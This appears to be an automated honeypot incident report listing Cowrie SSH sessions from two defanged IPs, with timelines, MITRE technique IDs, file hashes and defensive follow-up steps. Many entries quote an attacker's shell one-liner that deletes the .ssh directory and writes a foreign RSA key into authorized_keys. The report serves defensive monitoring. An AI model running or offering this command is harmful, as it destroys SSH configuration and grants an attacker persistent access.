### 🔴 HIGH · IR-a4f6daffd174

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:30 |
| **Last Seen** | 2026-04-24 21:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:30:58` | `cowrie.session.connect` |
| `2026-04-24 21:30:58` | `cowrie.client.version` |
| `2026-04-24 21:30:58` | `cowrie.client.kex` |
| `2026-04-24 21:30:59` | `cowrie.login.success` |
| `2026-04-24 21:31:00` | `cowrie.session.params` |
| `2026-04-24 21:31:00` | `cowrie.command.input` |
| `2026-04-24 21:31:00` | `cowrie.command.failed` |
| `2026-04-24 21:31:00` | `cowrie.log.closed` |
| `2026-04-24 21:31:01` | `cowrie.session.params` |
| `2026-04-24 21:31:01` | `cowrie.command.input` |
| `2026-04-24 21:31:01` | `cowrie.session.file_download` |
| `2026-04-24 21:31:01` | `cowrie.log.closed` |
| `2026-04-24 21:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84d6f57bd243

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:31 |
| **Last Seen** | 2026-04-24 21:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:31:05` | `cowrie.session.connect` |
| `2026-04-24 21:31:05` | `cowrie.client.version` |
| `2026-04-24 21:31:05` | `cowrie.client.kex` |
| `2026-04-24 21:31:06` | `cowrie.login.success` |
| `2026-04-24 21:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52620f3d7d7b

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:32 |
| **Last Seen** | 2026-04-24 21:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:32:30` | `cowrie.session.connect` |
| `2026-04-24 21:32:30` | `cowrie.client.version` |
| `2026-04-24 21:32:30` | `cowrie.client.kex` |
| `2026-04-24 21:32:31` | `cowrie.login.success` |
| `2026-04-24 21:32:32` | `cowrie.session.params` |
| `2026-04-24 21:32:32` | `cowrie.command.input` |
| `2026-04-24 21:32:32` | `cowrie.command.failed` |
| `2026-04-24 21:32:32` | `cowrie.log.closed` |
| `2026-04-24 21:32:33` | `cowrie.session.params` |
| `2026-04-24 21:32:33` | `cowrie.command.input` |
| `2026-04-24 21:32:33` | `cowrie.session.file_download` |
| `2026-04-24 21:32:33` | `cowrie.log.closed` |
| `2026-04-24 21:32:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d786b00e94fc

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:32 |
| **Last Seen** | 2026-04-24 21:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:32:36` | `cowrie.session.connect` |
| `2026-04-24 21:32:36` | `cowrie.client.version` |
| `2026-04-24 21:32:37` | `cowrie.client.kex` |
| `2026-04-24 21:32:38` | `cowrie.login.success` |
| `2026-04-24 21:32:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c61730d06f6

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:33 |
| **Last Seen** | 2026-04-24 21:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:33:59` | `cowrie.session.connect` |
| `2026-04-24 21:33:59` | `cowrie.client.version` |
| `2026-04-24 21:33:59` | `cowrie.client.kex` |
| `2026-04-24 21:34:00` | `cowrie.login.success` |
| `2026-04-24 21:34:01` | `cowrie.session.params` |
| `2026-04-24 21:34:01` | `cowrie.command.input` |
| `2026-04-24 21:34:01` | `cowrie.command.failed` |
| `2026-04-24 21:34:01` | `cowrie.log.closed` |
| `2026-04-24 21:34:02` | `cowrie.session.params` |
| `2026-04-24 21:34:02` | `cowrie.command.input` |
| `2026-04-24 21:34:02` | `cowrie.session.file_download` |
| `2026-04-24 21:34:02` | `cowrie.log.closed` |
| `2026-04-24 21:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1349732b12cf

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:34 |
| **Last Seen** | 2026-04-24 21:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:34:05` | `cowrie.session.connect` |
| `2026-04-24 21:34:05` | `cowrie.client.version` |
| `2026-04-24 21:34:06` | `cowrie.client.kex` |
| `2026-04-24 21:34:07` | `cowrie.login.success` |
| `2026-04-24 21:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34c76abb5f13

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:36 |
| **Last Seen** | 2026-04-24 21:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:36:18` | `cowrie.session.connect` |
| `2026-04-24 21:36:18` | `cowrie.client.version` |
| `2026-04-24 21:36:18` | `cowrie.client.kex` |
| `2026-04-24 21:36:19` | `cowrie.login.success` |
| `2026-04-24 21:36:20` | `cowrie.session.params` |
| `2026-04-24 21:36:20` | `cowrie.command.input` |
| `2026-04-24 21:36:20` | `cowrie.command.failed` |
| `2026-04-24 21:36:20` | `cowrie.log.closed` |
| `2026-04-24 21:36:21` | `cowrie.session.params` |
| `2026-04-24 21:36:21` | `cowrie.command.input` |
| `2026-04-24 21:36:21` | `cowrie.session.file_download` |
| `2026-04-24 21:36:21` | `cowrie.log.closed` |
| `2026-04-24 21:36:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ff53ca1bdba

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:36 |
| **Last Seen** | 2026-04-24 21:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:36:24` | `cowrie.session.connect` |
| `2026-04-24 21:36:24` | `cowrie.client.version` |
| `2026-04-24 21:36:25` | `cowrie.client.kex` |
| `2026-04-24 21:36:26` | `cowrie.login.success` |
| `2026-04-24 21:36:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a15b7a92220

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:37 |
| **Last Seen** | 2026-04-24 21:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:37:05` | `cowrie.session.connect` |
| `2026-04-24 21:37:05` | `cowrie.client.version` |
| `2026-04-24 21:37:05` | `cowrie.client.kex` |
| `2026-04-24 21:37:06` | `cowrie.login.success` |
| `2026-04-24 21:37:07` | `cowrie.session.params` |
| `2026-04-24 21:37:07` | `cowrie.command.input` |
| `2026-04-24 21:37:07` | `cowrie.command.failed` |
| `2026-04-24 21:37:07` | `cowrie.log.closed` |
| `2026-04-24 21:37:08` | `cowrie.session.params` |
| `2026-04-24 21:37:08` | `cowrie.command.input` |
| `2026-04-24 21:37:08` | `cowrie.session.file_download` |
| `2026-04-24 21:37:08` | `cowrie.log.closed` |
| `2026-04-24 21:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4913c3cf1996

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:37 |
| **Last Seen** | 2026-04-24 21:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:37:11` | `cowrie.session.connect` |
| `2026-04-24 21:37:11` | `cowrie.client.version` |
| `2026-04-24 21:37:12` | `cowrie.client.kex` |
| `2026-04-24 21:37:13` | `cowrie.login.success` |
| `2026-04-24 21:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f84d200040a

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:39 |
| **Last Seen** | 2026-04-24 21:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:39:22` | `cowrie.session.connect` |
| `2026-04-24 21:39:22` | `cowrie.client.version` |
| `2026-04-24 21:39:22` | `cowrie.client.kex` |
| `2026-04-24 21:39:24` | `cowrie.login.success` |
| `2026-04-24 21:39:24` | `cowrie.session.params` |
| `2026-04-24 21:39:24` | `cowrie.command.input` |
| `2026-04-24 21:39:24` | `cowrie.command.failed` |
| `2026-04-24 21:39:24` | `cowrie.log.closed` |
| `2026-04-24 21:39:25` | `cowrie.session.params` |
| `2026-04-24 21:39:25` | `cowrie.command.input` |
| `2026-04-24 21:39:25` | `cowrie.session.file_download` |
| `2026-04-24 21:39:25` | `cowrie.log.closed` |
| `2026-04-24 21:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04fba12c2036

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:39 |
| **Last Seen** | 2026-04-24 21:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:39:29` | `cowrie.session.connect` |
| `2026-04-24 21:39:29` | `cowrie.client.version` |
| `2026-04-24 21:39:29` | `cowrie.client.kex` |
| `2026-04-24 21:39:30` | `cowrie.login.success` |
| `2026-04-24 21:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43c1bbd2edea

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:40 |
| **Last Seen** | 2026-04-24 21:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:40:52` | `cowrie.session.connect` |
| `2026-04-24 21:40:52` | `cowrie.client.version` |
| `2026-04-24 21:40:53` | `cowrie.client.kex` |
| `2026-04-24 21:40:54` | `cowrie.login.success` |
| `2026-04-24 21:40:55` | `cowrie.session.params` |
| `2026-04-24 21:40:55` | `cowrie.command.input` |
| `2026-04-24 21:40:55` | `cowrie.command.failed` |
| `2026-04-24 21:40:55` | `cowrie.log.closed` |
| `2026-04-24 21:40:56` | `cowrie.session.params` |
| `2026-04-24 21:40:56` | `cowrie.command.input` |
| `2026-04-24 21:40:56` | `cowrie.session.file_download` |
| `2026-04-24 21:40:56` | `cowrie.log.closed` |
| `2026-04-24 21:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7bde70043b0

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:40 |
| **Last Seen** | 2026-04-24 21:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:40:59` | `cowrie.session.connect` |
| `2026-04-24 21:40:59` | `cowrie.client.version` |
| `2026-04-24 21:40:59` | `cowrie.client.kex` |
| `2026-04-24 21:41:01` | `cowrie.login.success` |
| `2026-04-24 21:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f10d49f85e8

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:41 |
| **Last Seen** | 2026-04-24 21:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:41:40` | `cowrie.session.connect` |
| `2026-04-24 21:41:40` | `cowrie.client.version` |
| `2026-04-24 21:41:40` | `cowrie.client.kex` |
| `2026-04-24 21:41:41` | `cowrie.login.success` |
| `2026-04-24 21:41:42` | `cowrie.session.params` |
| `2026-04-24 21:41:42` | `cowrie.command.input` |
| `2026-04-24 21:41:42` | `cowrie.command.failed` |
| `2026-04-24 21:41:42` | `cowrie.log.closed` |
| `2026-04-24 21:41:42` | `cowrie.session.params` |
| `2026-04-24 21:41:42` | `cowrie.command.input` |
| `2026-04-24 21:41:43` | `cowrie.session.file_download` |
| `2026-04-24 21:41:43` | `cowrie.log.closed` |
| `2026-04-24 21:41:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-073a18d28460

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:41 |
| **Last Seen** | 2026-04-24 21:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:41:46` | `cowrie.session.connect` |
| `2026-04-24 21:41:46` | `cowrie.client.version` |
| `2026-04-24 21:41:46` | `cowrie.client.kex` |
| `2026-04-24 21:41:48` | `cowrie.login.success` |
| `2026-04-24 21:41:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e2aa04fa54e

| Field | Detail |
|---|---|
| **Source IP** | `37.58.136[.]133` |
| **First Seen** | 2026-04-24 21:42 |
| **Last Seen** | 2026-04-24 21:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
